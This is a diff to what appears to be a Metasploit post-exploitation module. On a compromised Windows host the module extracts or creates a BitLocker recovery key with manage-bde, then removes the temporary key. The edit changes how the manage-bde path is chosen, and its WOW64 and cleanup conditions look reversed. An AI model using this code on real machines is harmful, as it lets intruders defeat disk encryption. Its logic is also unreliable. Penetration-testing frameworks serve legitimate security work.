@@ -68,15 +68,20 @@ class Metasploit3 < Msf::Post
     print_good("Successfuly opened Disk #{drive_number}")
     seek(0)
 
+
+    if sysinfo['Architecture'] =~ /WOW64/
+      manage_bde_path = "#{system_root}\\system32\\manage-bde.exe"
+    else
+      manage_bde_path = "#{system_root}\\sysnative\\manage-bde.exe"
+    end
+
     if !datastore['RECOVERY_KEY'].nil?
       print_status('Using provided recovery key')
       recovery_key = datastore['RECOVERY_KEY']
     else
       print_status('Trying to gather a recovery key')
 
-      cmd_out = cmd_exec("#{system_root}\\sysnative\\manage-bde.exe",
-                         "-protectors -get #{drive_letter}:")
-
+      cmd_out = cmd_exec("#{manage_bde_path}", "-protectors -get #{drive_letter}:")
       recovery_key = cmd_out.match(/((\d{6}-){7}\d{6})/)
 
       if !recovery_key.nil?
@@ -84,11 +89,11 @@ class Metasploit3 < Msf::Post
         print_good("Recovery key found : #{recovery_key}")
       else
         print_status('No recovery key found, trying to generate a new recovery key')
-        cmd_out = cmd_exec("#{system_root}\\sysnative\\manage-bde.exe",
-                           "-protectors -add #{drive_letter}: -RecoveryPassword")
+        cmd_out = cmd_exec("#{manage_bde_path}", "-protectors -add #{drive_letter}: -RecoveryPassword")
         recovery_key = cmd_out.match(/((\d{6}-){7}\d{6})/)
-        id_key_tmp = cmd_out.match(/(\{[^\}]+\})/)
+
         if !recovery_key.nil?
+          id_key_tmp = cmd_out.match(/(\{[^\}]+\})/)
           recovery_key = recovery_key[1]
           id_key_tmp = id_key_tmp[1]
           print_good("Recovery key generated successfuly : #{recovery_key}")
@@ -116,8 +121,7 @@ class Metasploit3 < Msf::Post
     ensure
       unless id_key_tmp
         print_status('Deleting temporary recovery key')
-        cmd_exec("#{system_root}\\sysnative\\manage-bde.exe",
-                 "-protectors -delete #{drive_letter}: -id #{id_key_tmp}")
+        cmd_exec("#{manage_bde_path}","-protectors -delete #{drive_letter}: -id #{id_key_tmp}")
       end
       client.railgun.kernel32.CloseHandle(@handle)
     end
